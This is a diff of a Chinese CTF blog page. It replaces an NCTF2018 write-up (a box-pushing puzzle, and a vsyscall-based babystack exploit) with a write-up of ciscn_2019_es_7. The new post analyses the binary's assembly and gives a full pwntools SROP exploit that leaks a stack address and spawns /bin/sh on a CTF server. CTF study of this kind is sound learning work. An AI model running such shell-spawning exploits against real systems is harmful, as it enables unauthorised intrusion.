@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="说是不再记录简单题的，无奈能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。">
+<meta name="description" content="SROP，甚至比CTFWIKI上的例题简单。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="NCTF2018">
-<meta property="og:url" content="http://yoursite.com/2018/11/26/NCTF2018/index.html">
+<meta property="og:title" content="ciscn_2019_es_7">
+<meta property="og:url" content="http://yoursite.com/2019/08/02/ciscn-2019-es-7/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="说是不再记录简单题的，无奈能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。">
+<meta property="og:description" content="SROP，甚至比CTFWIKI上的例题简单。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-02-12T16:01:00.709Z">
+<meta property="og:updated_time" content="2019-08-02T15:17:27.886Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="NCTF2018">
-<meta name="twitter:description" content="说是不再记录简单题的，无奈能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。">
+<meta name="twitter:title" content="ciscn_2019_es_7">
+<meta name="twitter:description" content="SROP，甚至比CTFWIKI上的例题简单。">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>NCTF2018 | 4eriri&#39;s blog</title>
+<title>ciscn_2019_es_7 | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -189,11 +189,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-NCTF2018" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ciscn-2019-es-7" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/11/26/NCTF2018/" class="article-date">
-      <time datetime="2018-11-26T09:07:04.000Z" itemprop="datePublished">2018-11-26</time>
+      <a href="/2019/08/02/ciscn-2019-es-7/" class="article-date">
+      <time datetime="2019-08-02T15:10:37.000Z" itemprop="datePublished">2019-08-02</time>
 </a>
 
 
@@ -208,7 +208,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      NCTF2018
+      ciscn_2019_es_7
     </h1>
   
 
@@ -225,28 +225,14 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>说是不再记录简单题的，无奈能做出来的全是简单题，没有好记录的23333，没做出来的之后看一波wp学习学习，然后再记录到这里吧。</p>
+        <p>SROP，甚至比CTFWIKI上的例题简单。</p>
 <a id="more"></a>
-<p>someboxes那一题看了很久一直没有一个具体的感觉，后来发现就是推箱子游戏，输入w450控制方向把两个箱子推到目标点就行了，不过地图还是有一些小问题，要看wp才能得到解答。</p>
-<p>babystack开了pie，看了网上的教程说可以只覆盖后四位，因为pie不会改变最后三位，所以多试几次肯定会成功，但是输入限制了必需要为8的倍数，与部分覆盖产生了冲突，不知道怎么解决。</p>
-<p>smallbug3也开了pie，先输入接下来接受的输入的长度，要求不大于128，感觉可以输入一个负数的十六进制的表达的形式那种来形成栈溢出，好像也成功了，但是这题不知道怎么泄漏libc基址，后来也就没做。</p>
-<h1 id="someboxes"><a href="#someboxes" class="headerlink" title="someboxes"></a>someboxes</h1><p>看了源码之后终于知道了地图哪里出了问题，原来地图中的每个数值都与下标异或了，再异或一次得到真正的地图。当时没看程序中有哪些地方对地图进行了操作（准确的说是看了但是没看见最底下有一个改写地图的orz。</p>
-<p>地图：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*  *  *  *  *  *  *  *  *  *  *  *  *  *  *  * </span><br><span class="line"> *  *  0  0  *  *  *  *  *  *  *  *  0  0  *  * </span><br><span class="line"> *  *  0  0  0  x  0  *  0  0  0  0  0  0  *  * </span><br><span class="line"> *  *  0  *  *  0  0  0  0  0  *  *  *  0  0  * </span><br><span class="line"> *  *  0  *  *  0  *  *  0  0  *  @  0  0  0  * </span><br><span class="line"> *  *  0  0  *  0  0  0  P  0  *  *  *  *  *  * </span><br><span class="line"> *  *  0  0  *  *  *  *  0  *  *  *  *  *  *  * </span><br><span class="line"> *  *  0  *  *  *  *  *  X  *  *  0  0  0  *  * </span><br><span class="line"> *  0  0  *  @  *  0  *  0  0  0  0  *  0  *  * </span><br><span class="line"> *  0  0  0  0  0  0  0  0  *  *  *  *  0  *  * </span><br><span class="line"> *  0  0  0  0  *  *  *  0  *  0  0  0  0  *  * </span><br><span class="line"> *  *  *  *  *  *  *  *  *  *  *  *  *  *  *  *]</span><br></pre></td></tr></table></figure>
-<p>玩家初始的位置用P表示，两个箱子用x表示，终点用@表示，不能推到*上，所以沿着0推就行了。</p>
-<p>操作顺序：aaawwdwaaawasssssssasddsdwwddddwwwwwaaawwdddsdwawddddwdssdsaa</p>
-<p>用W540替换：<br>444Wd0W444W4555555545d0d05d0Wd0d0d0d0W444Wd0d0d05d0W4Wd0d0d0d0Wd055d0544</p>
-<p>输入这个应该就可以得到flag了。</p>
-<h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p>看了github上的脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&apos;./babystack&apos;)</span><br><span class="line">p.sendline(p64(0xffffffffff600000)*5)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>orz其实完全不懂为啥，问了大佬然而大佬没看题目，后来偶然在群里看见有人说是vsyscall啥的，百度了一波，结果找到了之前就看过的<a href="https://bbs.ichunqiu.com/thread-43627-1-1.html" target="_blank" rel="noopener">一篇有关pie的教程</a>。</p>
-<p>如果仔细看看的话，在第三部分就能发现对vsyscall的介绍啥的……</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define VSYSCALL_ADDR_vgettimeofday   0xffffffffff600000</span><br></pre></td></tr></table></figure>
-<p>脚本中<code>0xffffffffff600000</code>就是调用<code>gettimeofday</code>函数吧。</p>
-<p>题目源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void vul()</span><br><span class="line">&#123;</span><br><span class="line">	char a[10];</span><br><span class="line">	int n = readn(a,256);</span><br><span class="line">	if(n%8 != 0) exit(0);</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">	vul();</span><br><span class="line">	exit(0);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	func();</span><br><span class="line">	system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>栈溢出一直覆盖到exit的返回地址之前，然后执行完vsyscall之后就会往下执行<code>system(&quot;/bin/sh&quot;)</code>了吧。</p>
-
+<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h       ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_read</span><br><span class="line">mov     rax, 1</span><br><span class="line">mov     edx, 30h        ; count</span><br><span class="line">lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">mov     rdi, rax        ; fd</span><br><span class="line">syscall                 ; LINUX - sys_write</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>调用syscall read&amp;write，之后直接retn。</p>
+<p>同时给了两个gadget，方便修改rax为相应的系统调用号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, 0Fh   //constants.SYS_sigreturn</span><br><span class="line">retn </span><br><span class="line">mov     rax, 3Bh	  //constants.SYS_execve</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>CTFWIKI上的例题只给了read调用，write调用还需要自己巧妙构造，这里直接可以leak出stack地址，然后就照着CTFWIKI上的脚本稍微改一改就行了。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import *#sh=process(&quot;./ciscn_2019_es_7.dms&quot;)context.arch=&apos;amd64&apos;sh=remote(&quot;f.buuoj.cn&quot;,20179)syscall_ret=0x400517read=0x4004f1movrax_sigreturn=0x4004damovrax_system=0x4004E2sh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(read))sh.recv(32)stack_addr=u64(sh.recv(8))log.success(&quot;stack: &quot;+hex(stack_addr))sh.recv(8)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr - 280  # &quot;/bin/sh&quot; &apos;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retsh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(sigframe))sh.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -254,13 +240,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/11/26/NCTF2018/">NCTF2018</a></p>
+        <p><span>本文标题:</span><a href="/2019/08/02/ciscn-2019-es-7/">ciscn_2019_es_7</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2018-11-26, 17:07:04</p>
-        <p><span>最后更新:</span>2019-02-13, 00:01:00</p>
+        <p><span>发布时间:</span>2019-08-02, 23:10:37</p>
+        <p><span>最后更新:</span>2019-08-02, 23:17:27</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/11/26/NCTF2018/" title="NCTF2018">http://yoursite.com/2018/11/26/NCTF2018/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/11/26/NCTF2018/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/08/02/ciscn-2019-es-7/" title="ciscn_2019_es_7">http://yoursite.com/2019/08/02/ciscn-2019-es-7/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/08/02/ciscn-2019-es-7/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -272,16 +258,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/02/05/brainfxxker-s-revenge/">
-                    HGAME2019-brainfxxker&#39;s revenge
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/11/21/格式化字符串/">
-                    格式化字符串
+                <a href="/2019/08/01/hacknote/">
+                    hacknote
                 </a>
             </div>
         
@@ -293,7 +273,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#someboxes"><span class="toc-number">1.</span> <span class="toc-text">someboxes</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babystack"><span class="toc-number">2.</span> <span class="toc-text">babystack</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#程序分析"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">2.</span> <span class="toc-text">EXP</span></a></li></ol>
         
     </div>
     <style>
@@ -329,7 +309,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"NCTF2018　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"ciscn_2019_es_7　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -348,8 +328,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2018/11/26/NCTF2018/';
-            this.page.identifier = '2018/11/26/NCTF2018/';
+            this.page.url = 'http://yoursite.com/2019/08/02/ciscn-2019-es-7/';
+            this.page.identifier = '2019/08/02/ciscn-2019-es-7/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -371,15 +351,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/02/05/brainfxxker-s-revenge/" title="上一篇: HGAME2019-brainfxxker&#39;s revenge">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/11/21/格式化字符串/" title="下一篇: 格式化字符串">
+            <a href="/2019/08/01/hacknote/" title="下一篇: hacknote">
                 <i class="fa fa-angle-right"></i>
             </a>
         
